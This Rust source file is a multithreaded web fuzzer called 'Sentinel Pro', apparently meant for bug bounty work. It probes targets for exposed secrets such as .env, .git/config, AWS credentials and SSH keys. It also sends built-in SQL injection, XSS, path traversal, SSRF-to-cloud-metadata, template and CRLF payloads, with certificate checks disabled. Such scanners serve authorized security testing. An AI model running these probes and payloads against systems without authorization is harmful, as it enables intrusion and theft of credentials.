// ============================================================================
// Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
// Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
//
// Unauthorized copying, distribution, or modification of this software,
// via any medium, is strictly prohibited without written permission.
// ============================================================================

use rayon::prelude::*;
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::io::{self, Read};
use std::time::{Duration, Instant};

// ── Input / Output types ──────────────────────────────────────────────────────

#[derive(Deserialize, Debug)]
struct FuzzInput {
    target: String,
    mode: String,          // "path" | "param" | "both"
    wordlist: Vec<String>,
    params: Option<Vec<String>>,
    payloads: Option<Vec<String>>,
    threads: Option<usize>,
    timeout_ms: Option<u64>,
}

#[derive(Serialize, Debug, Clone)]
struct FuzzResult {
    url: String,
    status_code: u16,
    content_length: u64,
    response_time_ms: u64,
    risk: String,
    finding_type: String,
    evidence: String,
}

#[derive(Serialize, Debug)]
struct FuzzOutput {
    target: String,
    mode: String,
    total_requests: usize,
    total_findings: usize,
    critical: usize,
    high: usize,
    medium: usize,
    risk_level: String,
    findings: Vec<FuzzResult>,
}

// ── Risk classification ───────────────────────────────────────────────────────

fn classify_path(path: &str, status: u16, _body: &str) -> (&'static str, &'static str) {
    let p = path.to_lowercase();

    // CRITICAL paths
    let critical = [
        ".git/config", ".env", ".env.local", ".env.production",
        "wp-config.php", "config.php", "database.yml", "secrets.yml",
        ".aws/credentials", "id_rsa", "private.key", "server.key",
        "backup.sql", "dump.sql", "db.sql", ".htpasswd",
        "phpinfo.php", "info.php", "test.php",
        "admin/config", "config/database", "application.properties",
        "appsettings.json", "web.config",
    ];
    for c in &critical {
        if p.contains(c) && status == 200 {
            return ("CRITICAL", "Sensitive file exposed");
        }
    }

    // HIGH paths
    let high = [
        "admin", "administrator", "wp-admin", "phpmyadmin", "adminer",
        "console", "manager", "dashboard", "panel", "cpanel",
        "api/v1", "api/v2", "api/internal", "graphql", "swagger",
        "actuator", "metrics", "health", "debug", "trace",
        "backup", "bak", "old", "tmp", "temp", "cache",
        ".git", ".svn", ".hg", "CVS",
    ];
    for h in &high {
        if p.contains(h) && (status == 200 || status == 401 || status == 403) {
            return ("HIGH", "Admin/sensitive endpoint");
        }
    }

    // MEDIUM — any 200/301/302 not in above
    if status == 200 || status == 301 || status == 302 {
        return ("MEDIUM", "Accessible endpoint");
    }

    ("LOW", "")
}

fn classify_param_response(body: &str, status: u16) -> Option<(&'static str, &'static str)> {
    // Error-based injection hints
    let sql_errors = [
        "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite_",
        "unclosed quotation", "syntax error", "odbc driver",
    ];
    for e in &sql_errors {
        if body.to_lowercase().contains(e) {
            return Some(("CRITICAL", "SQL error in response — possible SQLi"));
        }
    }

    // XSS reflection
    if body.contains("<script>alert(") || body.contains("xss_sentinel_probe") {
        return Some(("HIGH", "XSS payload reflected in response"));
    }

    // Path traversal
    if body.contains("root:x:0:0") || body.contains("[boot loader]") {
        return Some(("CRITICAL", "Path traversal — file content leaked"));
    }

    // SSRF hints
    if status == 200 && (body.contains("169.254.169.254") || body.contains("instance-id")) {
        return Some(("CRITICAL", "SSRF — cloud metadata leaked"));
    }

    None
}

// ── Default payloads ──────────────────────────────────────────────────────────

fn default_param_payloads() -> Vec<String> {
    vec![
        // SQLi
        "'".into(), "' OR '1'='1".into(), "1 AND 1=1".into(), "1; DROP TABLE users--".into(),
        // XSS
        "<script>alert(xss_sentinel_probe)</script>".into(),
        "\"><img src=x onerror=alert(1)>".into(),
        // Path traversal
        "../../etc/passwd".into(), "..\\..\\windows\\win.ini".into(),
        // SSRF
        "http://169.254.169.254/latest/meta-data/".into(),
        // Template injection
        "{{7*7}}".into(), "${7*7}".into(),
        // CRLF
        "%0d%0aX-Injected: sentinel".into(),
    ]
}

// ── Fuzzer core ───────────────────────────────────────────────────────────────

fn fuzz_paths(client: &Client, base_url: &str, wordlist: &[String]) -> Vec<FuzzResult> {
    wordlist.par_iter().filter_map(|word| {
        let word = word.trim();
        if word.is_empty() || word.starts_with('#') {
            return None;
        }
        let url = format!("{}/{}", base_url.trim_end_matches('/'), word);
        let start = Instant::now();

        let resp = client.get(&url).send().ok()?;
        let elapsed = start.elapsed().as_millis() as u64;
        let status  = resp.status().as_u16();

        if status == 404 || status == 400 {
            return None;
        }

        let content_length = resp.content_length().unwrap_or(0);
        let body = resp.text().unwrap_or_default();
        let (risk, finding_type) = classify_path(word, status, &body);

        if risk == "LOW" {
            return None;
        }

        Some(FuzzResult {
            url,
            status_code: status,
            content_length,
            response_time_ms: elapsed,
            risk: risk.into(),
            finding_type: finding_type.into(),
            evidence: format!("HTTP {} | {} bytes | {}ms", status, content_length, elapsed),
        })
    }).collect()
}

fn fuzz_params(
    client: &Client,
    base_url: &str,
    params: &[String],
    payloads: &[String],
) -> Vec<FuzzResult> {
    // Cartesian product: params × payloads — parallelised over params
    params.par_iter().flat_map(|param| {
        let mut results = Vec::new();
        for payload in payloads {
            let url = format!("{}?{}={}", base_url.trim_end_matches('/'), param,
                              urlencoding(payload));
            let start = Instant::now();
            let resp = match client.get(&url).send() {
                Ok(r) => r,
                Err(_) => continue,
            };
            let elapsed = start.elapsed().as_millis() as u64;
            let status  = resp.status().as_u16();
            let body    = resp.text().unwrap_or_default();

            if let Some((risk, finding_type)) = classify_param_response(&body, status) {
                results.push(FuzzResult {
                    url,
                    status_code: status,
                    content_length: body.len() as u64,
                    response_time_ms: elapsed,
                    risk: risk.into(),
                    finding_type: finding_type.into(),
                    evidence: format!("param={} payload={} HTTP {}", param, &payload[..payload.len().min(30)], status),
                });
            }
        }
        results
    }).collect()
}

fn urlencoding(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char);
            }
            _ => {
                out.push('%');
                out.push_str(&format!("{:02X}", b));
            }
        }
    }
    out
}

// ── Main ──────────────────────────────────────────────────────────────────────

fn main() -> io::Result<()> {
    let mut input = String::new();
    io::stdin().read_to_string(&mut input)?;

    let inp: FuzzInput = match serde_json::from_str(&input) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("JSON parse error: {}", e);
            std::process::exit(1);
        }
    };

    let threads  = inp.threads.unwrap_or(40).min(100);
    let timeout  = inp.timeout_ms.unwrap_or(8000);
    let payloads = inp.payloads.clone().unwrap_or_else(default_param_payloads);
    let params   = inp.params.clone().unwrap_or_else(|| vec![
        "id".into(), "page".into(), "url".into(), "redirect".into(),
        "file".into(), "path".into(), "q".into(), "search".into(),
        "user".into(), "name".into(), "token".into(), "key".into(),
    ]);

    rayon::ThreadPoolBuilder::new()
        .num_threads(threads)
        .build_global()
        .ok();

    let client = Client::builder()
        .timeout(Duration::from_millis(timeout))
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::limited(3))
        .user_agent("Mozilla/5.0 (Sentinel-Fuzzer)")
        .build()
        .expect("Failed to build HTTP client");

    let base_url = if inp.target.starts_with("http") {
        inp.target.clone()
    } else {
        format!("https://{}", inp.target)
    };

    let mut all_findings: Vec<FuzzResult> = Vec::new();
    let mut total_requests = 0usize;

    if inp.mode == "path" || inp.mode == "both" {
        total_requests += inp.wordlist.len();
        let mut r = fuzz_paths(&client, &base_url, &inp.wordlist);
        all_findings.append(&mut r);
    }

    if inp.mode == "param" || inp.mode == "both" {
        total_requests += params.len() * payloads.len();
        let mut r = fuzz_params(&client, &base_url, &params, &payloads);
        all_findings.append(&mut r);
    }

    // Sort by risk severity
    let order = |r: &str| match r { "CRITICAL" => 0, "HIGH" => 1, "MEDIUM" => 2, _ => 3 };
    all_findings.sort_by_key(|f| order(&f.risk));

    let critical = all_findings.iter().filter(|f| f.risk == "CRITICAL").count();
    let high     = all_findings.iter().filter(|f| f.risk == "HIGH").count();
    let medium   = all_findings.iter().filter(|f| f.risk == "MEDIUM").count();

    let risk_level = if critical > 0 { "CRITICAL" }
                     else if high > 0 { "HIGH" }
                     else if medium > 0 { "MEDIUM" }
                     else { "LOW" };

    let output = FuzzOutput {
        target: inp.target.clone(),
        mode: inp.mode.clone(),
        total_requests,
        total_findings: all_findings.len(),
        critical,
        high,
        medium,
        risk_level: risk_level.into(),
        findings: all_findings,
    };

    println!("{}", serde_json::to_string(&output).unwrap());
    Ok(())
}
